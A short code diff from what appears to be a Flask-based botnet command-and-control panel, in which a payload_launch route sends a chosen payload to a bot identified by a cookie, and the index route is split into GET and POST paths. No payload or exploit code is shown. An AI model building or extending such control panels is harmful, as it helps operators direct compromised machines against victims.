@@ -80,6 +80,7 @@ def payload_launch():
     if request.method == 'POST' and 'payload' in request.form:
         payload_name = request.form.get('payload')
     if 'bot' in request.cookies:
+
         botnet.sendPayload(request.cookies.get('bot'), payload_name)
         return "done"
     else:
@@ -107,7 +108,8 @@ def requires_auth(f):
     return decorated
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/')
+@app.route('/choose', methods=['POST'])
 @requires_auth
 def index():
     connected = ''
